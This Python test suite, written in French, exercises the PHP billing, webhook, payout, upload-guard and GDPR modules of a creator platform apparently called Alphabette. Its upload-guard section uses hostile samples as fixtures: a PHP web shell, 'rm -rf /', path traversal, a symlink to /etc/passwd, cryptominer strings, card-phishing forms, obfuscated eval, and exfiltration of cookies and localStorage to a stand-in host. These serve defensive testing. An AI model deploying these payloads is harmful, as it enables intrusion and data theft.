#!/usr/bin/env python3
"""
Tests du lot 3 : billing.php, webhooks.php, payouts.php, upload-guard.php, gdpr.php (PHP, OVH Perso).
Rien ne sort de la machine : php -S local, e-mails écrits dans un dossier temporaire, base SQLite temporaire.

    python3 tests/finance/test_finance.py
"""
import base64, hashlib, hmac, io, json, os, shutil, socket, sqlite3, subprocess, sys, tempfile, threading, time, urllib.request, urllib.error, uuid, zipfile

RACINE = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..'))
FICHIERS = ['finance-commun.php', 'croissance-commun.php', 'billing.php', 'webhooks.php', 'payouts.php', 'upload-guard.php', 'gdpr.php']
SECRET_WH = 'whsec_test_' + uuid.uuid4().hex
CLE_IBAN = os.urandom(32)
ADMIN = 'mot-de-passe-admin-' + uuid.uuid4().hex[:8]
DELAI = 2  # secondes avant que les gains deviennent disponibles (14 jours en production)

ok_n, ko = 0, []
def verifier(nom, cond, detail=''):
    global ok_n
    if cond: ok_n += 1
    else: ko.append(f'{nom} {detail}'); print('  ✗', nom, detail)

def port_libre():
    s = socket.socket(); s.bind(('127.0.0.1', 0)); p = s.getsockname()[1]; s.close(); return p

tmp = tempfile.mkdtemp(prefix='finance-')
web, prive, mails = (os.path.join(tmp, d) for d in ('web', 'prive', 'mails'))
for d in (web, prive, mails): os.makedirs(d)
for f in FICHIERS: shutil.copy(os.path.join(RACINE, 'serveur', 'php', f), os.path.join(web, f))
PORT = port_libre()
env = dict(os.environ, ALPHABETTE_FINANCE_DIR=prive, ALPHABETTE_FINANCE_MAIL_DIR=mails, ALPHABETTE_WEBHOOK_SECRET=SECRET_WH,
           ALPHABETTE_IBAN_KEY=CLE_IBAN.hex(), ALPHABETTE_ADMIN_PASSWORD=ADMIN, ALPHABETTE_FINANCE_DELAI=str(DELAI), PHP_CLI_SERVER_WORKERS='4')
serveur = subprocess.Popen(['php', '-S', f'127.0.0.1:{PORT}', '-t', web], env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
time.sleep(0.8)
BASE = f'http://127.0.0.1:{PORT}'

def http(chemin, corps=None, jeton=None, entetes=None, brut=None, methode=None):
    h = dict(entetes or {})
    data = None
    if brut is not None: data = brut
    elif corps is not None: data = json.dumps(corps).encode(); h['Content-Type'] = 'application/json'
    if jeton: h['Authorization'] = 'Bearer ' + jeton
    r = urllib.request.Request(BASE + chemin, data=data, headers=h, method=methode or ('POST' if data is not None else 'GET'))
    try:
        with urllib.request.urlopen(r, timeout=20) as rep: return rep.status, json.loads(rep.read() or b'{}')
    except urllib.error.HTTPError as e:
        t = e.read()
        try: return e.code, json.loads(t)
        except Exception: return e.code, {'brut': t.decode(errors='replace')}

def dernier_code(email):
    f = os.path.join(mails, email.replace('+', '_') + '.txt')
    import re
    return re.findall(r'\b(\d{6})\b', open(f, encoding='utf-8').read())[-1]

def connecter(email):
    s, d = http('/billing.php', {'action': 'connexion', 'email': email}); assert s == 200, d
    s, d = http('/billing.php', {'action': 'code', 'email': email, 'code': dernier_code(email)}); assert s == 200, d
    return d['jeton']

def signer(corps, t=None):
    t = int(time.time()) if t is None else t
    return f't={t},v1=' + hmac.new(SECRET_WH.encode(), f'{t}.'.encode() + corps, hashlib.sha256).hexdigest()

def webhook(ev, sig=None):
    corps = json.dumps(ev).encode()
    return http('/webhooks.php', brut=corps, entetes={'Stripe-Signature': sig if sig is not None else signer(corps), 'Content-Type': 'application/json'})

def vente(app, pi, montant=1500, evid=None):
    return webhook({'id': evid or 'evt_' + uuid.uuid4().hex, 'type': 'checkout.session.completed', 'data': {'object': {
        'id': 'cs_' + uuid.uuid4().hex, 'payment_status': 'paid', 'amount_total': montant, 'currency': 'eur', 'payment_intent': pi,
        'metadata': {'app': app}, 'customer_details': {'email': 'abonne@example.org'}}}})

def db():
    return sqlite3.connect(os.path.join(prive, 'finance.sqlite'))

try:
    # ───────── 1. Calculs en centimes ─────────
    print('1. Tarif et calculs en centimes')
    s, d = http('/billing.php?tarif')
    verifier('tarif 1500/1000/500/2000', (d['prixCents'], d['createurCents'], d['alphabetteCents'], d['seuilVirementCents']) == (1500, 1000, 500, 2000), d)
    verifier('rappel 15/10/5', d['rappel'] == '15 €/an = 10 € créateur / 5 € Alphabette')
    s, d = http('/billing.php?simulation&abonnes=7')
    verifier('simulation 7 × 1000 c.', d['revenuAnnuelCents'] == 7000 and d['revenuAnnuel'] == '70,00 €' and d['indicatif'] is True, d)
    s, d = http('/billing.php?simulation&abonnes=1.5'); verifier('simulation refuse les décimales', s == 400)
    s, d = http('/billing.php?simulation&abonnes=-3'); verifier('simulation refuse le négatif', s == 400)

    # ───────── 2. Comptes ─────────
    print('2. Connexion par code')
    s, d = http('/billing.php?revenus'); verifier('revenus sans connexion → 401', s == 401)
    s, d = http('/billing.php', {'action': 'connexion', 'email': 'pas-un-email'}); verifier('e-mail invalide refusé', s == 400)
    http('/billing.php', {'action': 'connexion', 'email': 'createur@example.org'})
    s, d = http('/billing.php', {'action': 'code', 'email': 'createur@example.org', 'code': '000000' if dernier_code('createur@example.org') != '000000' else '111111'})
    verifier('mauvais code refusé', s == 400)
    s, d = http('/billing.php', {'action': 'code', 'email': 'createur@example.org', 'code': dernier_code('createur@example.org')})
    verifier('bon code → jeton', s == 200 and len(d.get('jeton', '')) > 30, d)
    J = d['jeton']
    s, d = http('/billing.php', {'action': 'code', 'email': 'createur@example.org', 'code': dernier_code('createur@example.org')})
    verifier('code à usage unique', s == 400)
    s, d = http('/billing.php', {'action': 'lier_app', 'slug': 'mon-appli', 'email': 'createur@example.org'}, entetes={'X-Admin-Password': 'faux-mot-de-passe'})
    verifier('admin : mauvais mot de passe → 403', s == 403)
    s, d = http('/billing.php', {'action': 'lier_app', 'slug': 'mon-appli', 'email': 'createur@example.org'}, entetes={'X-Admin-Password': ADMIN})
    verifier('admin : appli rattachée', s == 200, d)

    # ───────── 3. Webhooks : signature + idempotence ─────────
    print('3. Webhooks signés et idempotents')
    ev = {'id': 'evt_test_rejeu_01', 'type': 'checkout.session.completed', 'data': {'object': {'id': 'cs_1', 'payment_status': 'paid', 'amount_total': 1500,
          'currency': 'eur', 'payment_intent': 'pi_001', 'metadata': {'app': 'mon-appli'}, 'customer_details': {'email': 'a@example.org'}}}}
    corps = json.dumps(ev).encode()
    s, d = http('/webhooks.php', brut=corps, entetes={'Content-Type': 'application/json'}); verifier('sans signature → 400', s == 400)
    s, d = http('/webhooks.php', brut=corps, entetes={'Stripe-Signature': 't=%d,v1=%s' % (time.time(), 'ab' * 32)}); verifier('fausse signature → 400', s == 400)
    s, d = http('/webhooks.php', brut=corps, entetes={'Stripe-Signature': signer(corps, int(time.time()) - 3600)}); verifier('signature périmée (rejeu) → 400', s == 400)
    s, d = http('/webhooks.php', brut=corps + b' ', entetes={'Stripe-Signature': signer(corps)}); verifier('corps modifié → 400', s == 400)
    s, d = http('/webhooks.php', brut=corps, entetes={'Stripe-Signature': signer(corps)})
    verifier('vente signée → abonnement créé', s == 200 and d['resultat'] == 'abonnement_cree', d)
    s, d = http('/webhooks.php', brut=corps, entetes={'Stripe-Signature': signer(corps)})
    verifier('même providerEventId → deja_traite', s == 200 and d['resultat'] == 'deja_traite', d)
    # 10 rejeux simultanés : aucune écriture en double
    res = []
    th = [threading.Thread(target=lambda: res.append(http('/webhooks.php', brut=corps, entetes={'Stripe-Signature': signer(corps)})[1].get('resultat'))) for _ in range(10)]
    [t.start() for t in th]; [t.join() for t in th]
    verifier('10 rejeux simultanés → tous deja_traite', res.count('deja_traite') == 10, res)
    s, d = vente('mon-appli', 'pi_001'); verifier('même paiement, autre événement → deja_enregistre', d['resultat'] == 'deja_enregistre', d)
    s, d = vente('mon-appli', 'pi_040', montant=4000); verifier('montant 40 € refusé (zéro Pass 40 €)', d['resultat'] == 'ignore_montant', d)
    s, d = vente('mon-appli', 'pi_float', montant=15.0); verifier('montant non entier refusé', d['resultat'] == 'ignore_montant', d)
    with db() as c:
        lignes = c.execute("SELECT beneficiaire, type, montant_centimes FROM ecritures WHERE provider_event_id = 'evt_test_rejeu_01' ORDER BY montant_centimes").fetchall()
        verifier('écritures exactes 500 Alphabette + 1000 créateur', lignes == [('alphabette', 'commission', 500), ('createur', 'vente', 1000)], lignes)
        verifier('somme = 1500 c.', sum(l[2] for l in lignes) == 1500)
        verifier('1 seul événement en base', c.execute("SELECT COUNT(*) FROM webhook_events WHERE provider_event_id='evt_test_rejeu_01'").fetchone()[0] == 1)
        verifier('montants en INTEGER', c.execute("SELECT COUNT(*) FROM ecritures WHERE typeof(montant_centimes) != 'integer'").fetchone()[0] == 0)
    s, d = vente('appli-de-valentin', 'pi_v1')
    with db() as c:
        l = c.execute("SELECT beneficiaire, SUM(montant_centimes) FROM ecritures WHERE app_slug='appli-de-valentin' GROUP BY beneficiaire").fetchall()
    verifier('appli sans créateur → 1500 c. Alphabette', l == [('alphabette', 1500)], l)

    # ───────── 4. Tableau de bord ─────────
    print('4. Mes revenus : en attente / disponible')
    s, d = http('/billing.php?revenus', jeton=J)
    verifier('1 abonné actif, revenus 1000 c.', d['abonnesActifs'] == 1 and d['revenusCents'] == 1000, d)
    verifier('gains en attente 1000 / disponible 0', d['pendingCents'] == 1000 and d['availableBalanceCents'] == 0, d)
    time.sleep(DELAI + 1)
    s, d = http('/billing.php?revenus', jeton=J)
    verifier('après le délai : disponible 1000', d['pendingCents'] == 0 and d['availableBalanceCents'] == 1000, d)
    verifier('jauge 50 %', d['progressionVirement'] == 50, d)
    s, d = http('/billing.php?historique&type=vente', jeton=J); verifier('historique filtré (vente)', len(d['lignes']) == 1 and d['lignes'][0]['montantCents'] == 1000, d)
    s, d = http('/billing.php?historique&type=virement', jeton=J); verifier('historique filtré (virement) vide', d['lignes'] == [])
    s, d = http('/billing.php?historique&type=nimporte', jeton=J); verifier('type inconnu refusé', s == 400)

    # ───────── 5. Virements : seuil 20 €, IBAN, OTP, verrou ─────────
    print('5. Virements')
    s, d = http('/payouts.php', {'action': 'demander'}, jeton=J); verifier('10 € disponibles → refus seuil', s == 400 and d.get('code') == 'seuil', d)
    vente('mon-appli', 'pi_002'); time.sleep(DELAI + 1)
    s, d = http('/billing.php?revenus', jeton=J); verifier('disponible exactement 2000 c.', d['availableBalanceCents'] == 2000, d)
    s, d = http('/payouts.php', {'action': 'demander'}, jeton=J); verifier('20 € sans IBAN → refus iban', s == 400 and d.get('code') == 'iban', d)
    s, d = http('/billing.php', {'action': 'iban', 'iban': 'FR76 3000 6000 0112 3456 7890 188'}, jeton=J); verifier('IBAN à mauvaise clé refusé', s == 400)
    s, d = http('/billing.php', {'action': 'iban', 'iban': 'FR76 3000 6000 0112 3456 7890 189'}, jeton=J)
    verifier('IBAN valide masqué FR76 •••• •••• 0189', s == 200 and d['ibanMasque'] == 'FR76 •••• •••• 0189', d)
    with db() as c: paquet, fin = c.execute("SELECT iban_chiffre, iban_fin FROM comptes WHERE email='createur@example.org'").fetchone()
    verifier('IBAN chiffré au repos (pas en clair)', paquet.startswith('v1:') and '30006000' not in paquet and '0189' not in paquet)
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    b = base64.b64decode(paquet[3:]); cid = None
    with db() as c: cid = c.execute("SELECT id FROM comptes WHERE email='createur@example.org'").fetchone()[0]
    clair = AESGCM(CLE_IBAN).decrypt(b[:12], b[28:] + b[12:28], f'iban:{cid}'.encode()).decode()
    verifier('déchiffrement AES-256-GCM avec la clé', clair == 'FR7630006000011234567890189')
    try: AESGCM(os.urandom(32)).decrypt(b[:12], b[28:] + b[12:28], f'iban:{cid}'.encode()); verifier('mauvaise clé échoue', False)
    except Exception: verifier('mauvaise clé échoue', True)
    try: AESGCM(CLE_IBAN).decrypt(b[:12], b[28:] + b[12:28], b'iban:999'); verifier('IBAN lié au compte (AAD)', False)
    except Exception: verifier('IBAN lié au compte (AAD)', True)
    s, d = http('/billing.php?revenus', jeton=J); verifier('tableau de bord : IBAN masqué', d['ibanMasque'] == 'FR76 •••• •••• 0189', d)
    s, d = http('/payouts.php', {'action': 'demander'}, jeton=J); verifier('demande → code envoyé', s == 200 and d['montantCents'] == 2000, d)
    code = dernier_code('createur@example.org')
    s, d = http('/payouts.php', {'action': 'confirmer', 'code': '12345'}, jeton=J); verifier('code mal formé refusé', s == 400)
    # Deux confirmations simultanées avec le bon code : un seul virement
    res = []
    th = [threading.Thread(target=lambda: res.append(http('/payouts.php', {'action': 'confirmer', 'code': code}, jeton=J)[0])) for _ in range(6)]
    [t.start() for t in th]; [t.join() for t in th]
    verifier('6 confirmations simultanées → 1 seule acceptée', res.count(200) == 1, res)
    with db() as c: nv = c.execute("SELECT COUNT(*), SUM(montant_centimes) FROM virements").fetchone()
    verifier('1 virement de 2000 c. en base', nv == (1, 2000), nv)
    s, d = http('/billing.php?revenus', jeton=J); verifier('solde disponible 0 après virement', d['availableBalanceCents'] == 0 and d['virementEnCours'] is True, d)
    s, d = http('/payouts.php', {'action': 'demander'}, jeton=J); verifier('nouvelle demande pendant un virement → refus', s == 400, d)
    s, d = http('/payouts.php?admin', entetes={'X-Admin-Password': ADMIN}); verifier('admin voit l\'IBAN déchiffré', d['virements'][0]['iban'] == 'FR7630006000011234567890189', d)
    vid = d['virements'][0]['id']
    s, d = http('/payouts.php', {'action': 'rejeter', 'id': vid}, entetes={'X-Admin-Password': ADMIN}); verifier('admin rejette', s == 200)
    s, d = http('/billing.php?revenus', jeton=J); verifier('rejet → 2000 c. recrédités', d['availableBalanceCents'] == 2000, d)
    s, d = http('/payouts.php', {'action': 'rejeter', 'id': vid}, entetes={'X-Admin-Password': ADMIN}); verifier('double traitement refusé', s == 404)
    # OTP expiré : on règle l'horloge du serveur ? → test par 5 mauvais essais (blocage)
    http('/payouts.php', {'action': 'demander'}, jeton=J)
    for _ in range(5): http('/payouts.php', {'action': 'confirmer', 'code': '000001'}, jeton=J)
    s, d = http('/payouts.php', {'action': 'confirmer', 'code': dernier_code('createur@example.org')}, jeton=J)
    verifier('code bloqué après 5 essais faux', s == 429, d)
    with db() as c: c.execute("UPDATE otp SET expire = 1"); c.commit()
    s, d = http('/payouts.php', {'action': 'confirmer', 'code': dernier_code('createur@example.org')}, jeton=J); verifier('code expiré (15 min) refusé', s == 400, d)

    # ───────── 6. Remboursement ─────────
    print('6. Remboursement sans prorata')
    s, d = webhook({'id': 'evt_refund_0001', 'type': 'charge.refunded', 'data': {'object': {'payment_intent': 'pi_002'}}})
    verifier('remboursement traité', d['resultat'] == 'rembourse', d)
    s, d = webhook({'id': 'evt_refund_0001', 'type': 'charge.refunded', 'data': {'object': {'payment_intent': 'pi_002'}}})
    verifier('remboursement rejoué → deja_traite', d['resultat'] == 'deja_traite', d)
    s, d = http('/billing.php?revenus', jeton=J); verifier('remboursement : -1000 c., 1 abonné', d['availableBalanceCents'] == 1000 and d['abonnesActifs'] == 1, d)
    with db() as c: tot = c.execute("SELECT SUM(e.montant_centimes) FROM ecritures e JOIN abonnements a ON a.id = e.abonnement_id WHERE a.paiement_ref='pi_002'").fetchone()[0]
    verifier('écritures du remboursé = 0 c.', tot == 0, tot)

    # ───────── 7. Pare-feu d'upload ─────────
    print("7. Pare-feu d'upload et scanner")
    def zipper(fichiers, symlink=None):
        b = io.BytesIO()
        with zipfile.ZipFile(b, 'w', zipfile.ZIP_DEFLATED) as z:
            for n, c in fichiers.items(): z.writestr(n, c)
            if symlink:
                i = zipfile.ZipInfo(symlink); i.create_system = 3; i.external_attr = (0o120777 << 16); z.writestr(i, '/etc/passwd')
        p = os.path.join(tmp, uuid.uuid4().hex + '.zip'); open(p, 'wb').write(b.getvalue()); return p
    def cli(p):
        r = subprocess.run(['php', os.path.join(web, 'upload-guard.php'), p], capture_output=True, text=True, env=env)
        return r.returncode, json.loads(r.stdout)
    propre = {'index.html': '<!doctype html><h1>Bonjour</h1><script src="app.js"></script>', 'app.js': 'document.querySelector("h1").textContent = "Salut";', 'style.css': 'h1{color:#123}'}
    rc, v = cli(zipper(propre)); verifier('archive propre acceptée', rc == 0 and v['ok'] and v['fichiers'] == 3, v)
    cas = {
        'extension .php': ({'index.html': 'x', 'shell.php': '<?php system($_GET[1]);'}, 'extension_interdite'),
        'double extension .php.png': ({'a.php.png': 'x'}, 'extension_interdite'),
        'extension .exe': ({'outil.exe': 'MZ'}, 'extension_interdite'),
        'extension .sh': ({'install.sh': 'rm -rf /'}, 'extension_interdite'),
        '.htaccess': ({'.htaccess': 'AddHandler php .png'}, 'extension_interdite'),
        'chemin ../': ({'../../evil.html': 'x'}, 'chemin_interdit'),
        'chemin absolu': ({'/etc/x.html': 'x'}, 'chemin_interdit'),
        'window.top.location': ({'i.js': 'window.top.location = "https://pirate.example"'}, 'sortie_cadre'),
        'parent.location': ({'i.js': 'parent.location.href="x"'}, 'sortie_cadre'),
        'frameElement': ({'i.js': 'if (window.frameElement) frameElement.remove()'}, 'sortie_cadre'),
        'mineur coinhive': ({'m.js': 'var m = new CoinHive.Anonymous("k"); m.start();'}, 'mineur_crypto'),
        'mineur stratum': ({'m.js': 'connect("stratum+tcp://pool.example:3333")'}, 'mineur_crypto'),
        'mineur WASM': ({'m.wasm': b'\x00asm cryptonight_hash'}, 'mineur_crypto'),
        'phishing carte': ({'p.html': '<input autocomplete="cc-number" name="n">'}, 'phishing_carte'),
        'phishing CVV': ({'p.html': '<input name="cvv">'}, 'phishing_carte'),
        'phishing identifiants Alphabette': ({'p.html': '<p>Connectez-vous à votre compte Alphabette, mot de passe :</p><input type="password">'}, 'phishing_identifiants'),
        'eval(atob(': ({'o.js': 'eval(atob("YWxlcnQoMSk="))'}, 'eval_obfusque'),
        'new Function(atob': ({'o.js': 'new Function(atob(x))()'}, 'eval_obfusque'),
        'exfiltration cookie': ({'e.js': 'fetch("https://x.example/?c=" + document.cookie)'}, 'exfiltration'),
        'exfiltration localStorage': ({'e.js': 'const d = JSON.stringify(localStorage); navigator.sendBeacon("https://x.example", d)'}, 'exfiltration'),
        'exécutable déguisé en .js': ({'a.js': '\x7fELF\x02\x01'}, 'executable_deguise'),
    }
    for nom, (fichiers, code_attendu) in cas.items():
        rc, v = cli(zipper(fichiers)); codes = [r['code'] for r in v['raisons']]
        verifier(f'bloque : {nom}', rc == 1 and code_attendu in codes, codes)
    rc, v = cli(zipper({'index.html': 'x'}, symlink='lien')); verifier('lien symbolique bloqué', 'lien_symbolique' in [r['code'] for r in v['raisons']], v)
    rc, v = cli(zipper({f'f{i}.txt': 'x' for i in range(201)})); verifier('201 fichiers bloqués', v['raisons'][0]['code'] == 'trop_de_fichiers', v)
    rc, v = cli(zipper({f'f{i}.txt': 'x' for i in range(200)})); verifier('200 fichiers acceptés', v['ok'], v)
    rc, v = cli(zipper({'bombe.txt': b'\0' * (11 * 1024 * 1024)})); verifier('bombe ZIP 11 Mo bloquée', v['raisons'][0]['code'] == 'trop_gros', v)
    verifier('bombe : archive compressée petite', True)
    # en-tête menteur : taille déclarée 10 octets pour 11 Mo réels
    p = zipper({'menteur.txt': b'\0' * (11 * 1024 * 1024)})
    raw = bytearray(open(p, 'rb').read())
    import struct
    cd = raw.rfind(b'PK\x01\x02'); struct.pack_into('<I', raw, cd + 24, 10)
    lf = raw.find(b'PK\x03\x04'); struct.pack_into('<I', raw, lf + 22, 10)
    open(p, 'wb').write(raw)
    rc, v = cli(p); verifier('taille déclarée mensongère détectée en lecture', rc == 1 and any(r['code'] in ('trop_gros', 'archive_illisible') for r in v['raisons']), v)
    rc, v = cli(zipper({f'f{i}.txt': b'a' * (1024 * 1024) for i in range(9)})); verifier('9 Mo réels acceptés', v['ok'], v)
    texte_normal = {'index.html': '<p>top et parent sont des mots normaux. Le scrollTop.location ne compte pas.</p>'}
    rc, v = cli(zipper(texte_normal)); verifier('pas de faux positif sur les mots « top/parent »', v['ok'], v)

    # Doublons par empreinte SHA-256 et structure (HTTP + publication)
    def envoyer(jeton, slug, chemin, publier='1'):
        limite = uuid.uuid4().hex
        corps = (f'--{limite}\r\nContent-Disposition: form-data; name="slug"\r\n\r\n{slug}\r\n--{limite}\r\nContent-Disposition: form-data; name="publier"\r\n\r\n{publier}\r\n'
                 f'--{limite}\r\nContent-Disposition: form-data; name="archive"; filename="a.zip"\r\nContent-Type: application/zip\r\n\r\n').encode() + open(chemin, 'rb').read() + f'\r\n--{limite}--\r\n'.encode()
        return http('/upload-guard.php', brut=corps, jeton=jeton, entetes={'Content-Type': f'multipart/form-data; boundary={limite}'})
    zp = zipper(propre)
    s, d = envoyer(None, 'appli-a', zp); verifier('upload sans connexion → 401', s == 401)
    s, d = envoyer(J, 'appli-a', zp); verifier('upload propre publié (validation manuelle)', s == 200 and d.get('enregistre') and d.get('validation') == 'manuelle', d)
    J2 = connecter('autre@example.org')
    s, d = envoyer(J2, 'copie-a', zipper(propre)); verifier('copie exacte d\'un autre → doublon', s == 422 and d['doublon']['type'] == 'identique', d)
    modifie = dict(propre); modifie['app.js'] = 'console.log(1)'
    s, d = envoyer(J2, 'copie-b', zipper(modifie)); verifier('même structure, autre créateur → doublon_structure', s == 422 and d['doublon']['type'] == 'structure', d)
    s, d = envoyer(J, 'appli-a', zipper(modifie)); verifier('nouvelle version de sa propre appli acceptée', s == 200, d)
    s, d = envoyer(J, 'piege', zipper({'x.php': '<?php'})); verifier('upload dangereux → 422', s == 422)

    # ───────── 8. Signalements citoyens ─────────
    print('8. Signalements')
    J3 = connecter('troisieme@example.org')
    s, d = http('/upload-guard.php', {'action': 'signaler', 'app_id': 'appli-a', 'motif': 'arnaque'}, jeton=J); verifier('1er signalement', d['signalements'] == 1 and d['statut'] == 'active', d)
    s, d = http('/upload-guard.php', {'action': 'signaler', 'app_id': 'appli-a', 'motif': 'arnaque'}, jeton=J); verifier('même utilisateur compte une fois', d['signalements'] == 1, d)
    s, d = http('/upload-guard.php', {'action': 'signaler', 'app_id': 'appli-a', 'motif': 'arnaque'}, jeton=J2); verifier('2e utilisateur', d['signalements'] == 2 and d['statut'] == 'active', d)
    s, d = http('/upload-guard.php', {'action': 'signaler', 'app_id': 'appli-a', 'motif': 'arnaque'}); verifier('3e utilisateur (anonyme) → paused_abuse', d['signalements'] == 3 and d['statut'] == 'paused_abuse', d)
    s, d = http('/upload-guard.php', {'action': 'signaler', 'app_id': 'appli-b', 'motif': 'bug'}); verifier('« ne marche pas » ne compte pas comme abus', d.get('compte') is False, d)
    s, d = http('/upload-guard.php?statut=appli-a'); verifier('statut public paused_abuse', d['statut'] == 'paused_abuse')
    verifier('alerte admin envoyée', 'appli mise en pause' in open(os.path.join(mails, 'azertylm@gmail.com.txt'), encoding='utf-8').read())
    s, d = http('/upload-guard.php', {'action': 'reactiver', 'slug': 'appli-a'}, entetes={'X-Admin-Password': ADMIN}); verifier('admin réactive', s == 200)
    s, d = http('/upload-guard.php?statut=appli-a'); verifier('appli de nouveau active', d['statut'] == 'active')

    # ───────── 9. RGPD ─────────
    print('9. RGPD')
    s, d = http('/gdpr.php?politique'); verifier('politique zéro traceur', d['traceurs_tiers'] == 'Aucun.')
    s, d = http('/gdpr.php', {'action': 'visite', 'app': 'mon-appli'}); verifier('visite comptée sans identifiant', s == 200)
    with db() as c: verifier('table visites sans IP', [r[1] for r in c.execute('PRAGMA table_info(visites)')] == ['app_slug', 'jour', 'n'])
    s, d = http('/gdpr.php?export', jeton=J)
    verifier('export JSON complet', s == 200 and d['compte']['email'] == 'createur@example.org' and len(d['ecritures']) >= 4 and d['compte']['iban'] == 'FR76 •••• •••• 0189', d.get('compte'))
    verifier('export sans IBAN en clair', '30006000' not in json.dumps(d))
    s, d = http('/gdpr.php', {'action': 'supprimer', 'confirmation': 'oui'}, jeton=J); verifier('suppression sans mot SUPPRIMER refusée', s == 400)
    s, d = http('/gdpr.php', {'action': 'supprimer', 'confirmation': 'SUPPRIMER'}, jeton=J); verifier('compte supprimé', s == 200, d)
    s, d = http('/billing.php?revenus', jeton=J); verifier('jeton révoqué après suppression', s == 401)
    with db() as c:
        row = c.execute('SELECT email, email_hash, iban_chiffre, iban_fin, supprime_le FROM comptes WHERE id = ?', (cid,)).fetchone()
        verifier('données personnelles effacées', row[:4] == (None, None, None, None) and row[4], row)
        verifier('écritures comptables conservées', c.execute('SELECT COUNT(*) FROM ecritures WHERE compte_id = ?', (cid,)).fetchone()[0] >= 4)
        verifier('signalements anonymisés', c.execute("SELECT COUNT(*) FROM signalements WHERE rapporteur = ?", (f'c:{cid}',)).fetchone()[0] == 0)
    s, d = http('/billing.php', {'action': 'connexion', 'email': 'createur@example.org'}); verifier('réinscription possible (nouveau compte)', s == 200)

    # ───────── 10. Fichiers non exposés ─────────
    s, d = http('/finance-commun.php'); verifier('finance-commun.php inaccessible seul', s == 404)
finally:
    serveur.terminate()
    shutil.rmtree(tmp, ignore_errors=True)

print(f'\n{ok_n}/{ok_n + len(ko)} vérifications réussies')
sys.exit(1 if ko else 0)
